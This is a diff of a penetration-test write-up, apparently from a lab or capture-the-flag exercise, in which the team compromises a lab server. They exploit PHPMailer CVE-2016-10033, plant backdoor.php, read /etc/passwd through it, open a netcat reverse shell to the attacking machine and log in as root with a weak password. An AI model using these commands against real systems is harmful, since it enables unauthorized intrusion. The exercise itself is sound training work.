@@ -213,7 +213,7 @@ The Offensive Team was able to penetrate `Target 2` and retrieve the following c
     - Command: 
       - `nikto -C all -h 192.168.1.115`
  
-![Nikto](https://user-images.githubusercontent.com/85250007/177843573-68ee3408-d726-4166-8c12-4a09bbaad444.gif)
+    ![Nikto](https://user-images.githubusercontent.com/85250007/177843573-68ee3408-d726-4166-8c12-4a09bbaad444.gif)
 
    - Determined the website is running on Apache/2.4.0 (Debian).
    - Performed a more in-depth enumeration with Gobuster.
@@ -222,26 +222,26 @@ The Offensive Team was able to penetrate `Target 2` and retrieve the following c
      - `apt install gobuster`
      - `gobuster -w /usr/share/wordlists/disbuster/directory-list-2.3-medium/txt dir -u 192.168.1.115`
 
-![Apt Get Update](https://user-images.githubusercontent.com/85250007/177845805-08ab33e8-ffc1-4822-99e4-01a7a126cbb0.gif)
+    ![Apt Get Update](https://user-images.githubusercontent.com/85250007/177845805-08ab33e8-ffc1-4822-99e4-01a7a126cbb0.gif)
 
-![Apt install gobuster](https://user-images.githubusercontent.com/85250007/177845806-bd79adfc-4204-4a65-8a51-ba8721b1d0be.gif)
+    ![Apt install gobuster](https://user-images.githubusercontent.com/85250007/177845806-bd79adfc-4204-4a65-8a51-ba8721b1d0be.gif)
 
-![Gobusting](https://user-images.githubusercontent.com/85250007/177845803-06c3bfa8-6f12-4616-9dde-5145257a7023.gif)
+    ![Gobusting](https://user-images.githubusercontent.com/85250007/177845803-06c3bfa8-6f12-4616-9dde-5145257a7023.gif)
 
-The PATH file in the Vendor Directory was modified recently compare to the other files.
+- The PATH file in the Vendor Directory was modified recently compare to the other files.
 Subsequent investigation of the file reveled Flag 1.
 
-![Flag1](https://user-images.githubusercontent.com/85250007/177843725-137ef889-48c5-45a2-b626-0133975ca006.gif)
+    ![Flag1](https://user-images.githubusercontent.com/85250007/177843725-137ef889-48c5-45a2-b626-0133975ca006.gif)
 
-Investigated the VERSION file and discoverd the PHPMailer version being used is 5.2.16
+- Investigated the VERSION file and discoverd the PHPMailer version being used is 5.2.16
 
-![VERSION](https://user-images.githubusercontent.com/85250007/177847353-09ca3d6e-82d2-41ba-b7c1-e7da9727a967.gif)
+    ![VERSION](https://user-images.githubusercontent.com/85250007/177847353-09ca3d6e-82d2-41ba-b7c1-e7da9727a967.gif)
 
-Investigated the SECURITY.md file and identified CVE-2016-10033 (Remote Code Execution Vulnerabilty) as a potential exploit for PHPMailer version 5.2.16. 
+- Investigated the SECURITY.md file and identified CVE-2016-10033 (Remote Code Execution Vulnerabilty) as a potential exploit for PHPMailer version 5.2.16. 
 
 As well, it looks as if the site is also using PHPMailer 5.2.16
 
-![SECURITY](https://user-images.githubusercontent.com/85250007/177849262-2b82ea07-9221-48af-b879-9d75bf92a7b2.gif)
+    ![SECURITY](https://user-images.githubusercontent.com/85250007/177849262-2b82ea07-9221-48af-b879-9d75bf92a7b2.gif)
 
 - `Flag2: 6a8ed560f0b5358ecf844108048eb337`
 
@@ -255,23 +255,30 @@ As well, it looks as if the site is also using PHPMailer 5.2.16
     - Command: 
      - `searchsploit phpmailer`
 
-![SearchSploit](https://user-images.githubusercontent.com/85250007/177851350-9393bdb3-e297-4916-bb97-23eaa32a6dfe.gif)
+    ![SearchSploit](https://user-images.githubusercontent.com/85250007/177851350-9393bdb3-e297-4916-bb97-23eaa32a6dfe.gif)
+
 
 - Confirmed exploit 40970.php matched with CVE-2016-10033 and PHPMailer version 5.2.16
     - Command: 
      - `searchsploit -x /usr/share/exploitdb/exploits/php/webapps/40970.php`
 
-![searchsploit webapps](https://user-images.githubusercontent.com/85250007/177852084-be51e1fb-ed42-4ac2-bfb4-af39685f1494.gif)
+
+    ![searchsploit webapps](https://user-images.githubusercontent.com/85250007/177852084-be51e1fb-ed42-4ac2-bfb4-af39685f1494.gif)
+
 
 - Used the script exploit.sh to exploit the vulnerability by opening a Ncat connection to attach kali VM.
 
-![Exploit sh](https://user-images.githubusercontent.com/85250007/177852855-714385f9-38be-4845-a0c9-8b1a37fb727c.gif)
+
+    ![Exploit sh](https://user-images.githubusercontent.com/85250007/177852855-714385f9-38be-4845-a0c9-8b1a37fb727c.gif)
+
 
 - Ran the script and uploaded the file backdoor.php to the target server to allow command injection attacks to be executed.
     - Command: 
      - `bash exploit.sh`
 
-![Bash Exploit sh](https://user-images.githubusercontent.com/85250007/177853263-ba0580e5-1c36-43b6-90ce-1e45b664505a.gif)
+
+    ![Bash Exploit sh](https://user-images.githubusercontent.com/85250007/177853263-ba0580e5-1c36-43b6-90ce-1e45b664505a.gif)
+
 
 - Navigating to 192.168.1.115/backdoor.php?cmd=<CMD> now allow bash commands to be executed on target 2.
    - URL: 192.168.1.115/backdoor.php?cmd=cat%20/etc/passwd
@@ -280,13 +287,61 @@ As well, it looks as if the site is also using PHPMailer 5.2.16
    - Started Ncat listener on he attacking Kali VM
     - `nc -lnvp 4444`
     
-![4444](https://user-images.githubusercontent.com/85250007/177855001-b55ca07e-09cf-4367-b378-4ff53ca791c0.gif)
+    
+    ![4444](https://user-images.githubusercontent.com/85250007/177855001-b55ca07e-09cf-4367-b378-4ff53ca791c0.gif)
 
+    
 - In the browser, use the backdoor to run commands and opne a reverse shell on the target.
     - Command: 
-     - `b=nc 192.168.1.90 4444 -e /bin/bash`
+     - `nc 192.168.1.90 4444 -e /bin/bash`
      - URL: 192.168.1.115/backdoor.php?cmd=nc%20192.168.1.90%204444%20-e%20/bin/bash
     
+    ![website drop](https://user-images.githubusercontent.com/85250007/177857596-b28b8b65-6187-4da3-b780-74e302b1842e.gif)
+    
 
+- This allowed the Ncat listener to connect to the target.
+   - Interactive user shell opened on the target using the following
+    - `python -c 'import pty;pty.spawn("/bin/bash")`
+ 
+
+    ![Python](https://user-images.githubusercontent.com/85250007/177858063-767e8839-f458-4732-b41e-ba12944f02cc.gif)
+    
+    
+ - After gaining shell sessions, flag 2 was discovered in /var/wwww.
+    
+   
+    ![flag2](https://user-images.githubusercontent.com/85250007/177858792-2ce427a2-58ab-412a-9ceb-3c433ece60d3.gif)
+   
+   
+- `Flag3: a0f568aa9de277887f37730d71520d9b`
+
+ - Exploit Used:
+    - Used shell access on target to search WordPress uploads directory for flag 3, discovered path location, and navigated to the web browser to view flag3.png.
+    - Command: 
+     - `find /var/wwww -type f -iname 'flag*'`
+     - URL `192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png`
+     - Used the command to find flags in the wordpress uploads directory.
+
+    
+    ![WP flag 3](https://user-images.githubusercontent.com/85250007/177859805-fb9cef03-7471-4b80-b1e9-e3da96f39336.gif)
+
+    
+- In the browser, navigated to 192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png
+    
+
+    ![Flag 3](https://user-images.githubusercontent.com/85250007/177860371-db2d3fc8-8b01-4c73-9e39-9b84b868ba04.gif)
+    
+    
+- `Flag4: df2bc5e951d91581467bb9a2a8ff4425`
+
+ - Exploit Used:
+    - Escalated to root by using su root command and manual brute force to find a password, changed to the root directory, and found Flag 4 in the text file.
+    - Command: 
+     - `su root` password `toor` `cd /root` `cat flag4.txt`
+    
+    
+![Flag 4](https://user-images.githubusercontent.com/85250007/177861253-852e45e6-afe7-4c92-bedc-520e2a030253.gif)
+
+    
 
 
